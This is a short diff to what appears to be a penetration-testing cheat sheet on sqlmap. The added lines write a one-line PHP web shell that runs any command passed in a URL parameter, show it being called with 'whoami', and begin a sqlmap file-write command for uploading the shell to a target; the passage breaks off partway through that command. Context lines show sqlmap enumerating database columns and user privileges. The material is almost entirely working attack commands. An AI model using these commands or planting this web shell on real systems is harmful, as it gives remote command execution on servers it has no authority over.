@@ -748,6 +748,14 @@ sqlmap -u "http://example/index.php?id=8" -D extramile -T flags --columns --batc
 sqlmap -u "http://example/page.php?id=8" --privileges --current-user
 ```
 
+shell.php
+
+```shell
+echo "<?php system(\$_GET['cmd']); ?>" > shell.php
+```
+
+    - http://target.com/shell.php?cmd=whoami
+
 ```shell
 sqlmap -u "http://target.com/page.php?id=1" \
 --file-write="shell.php" \
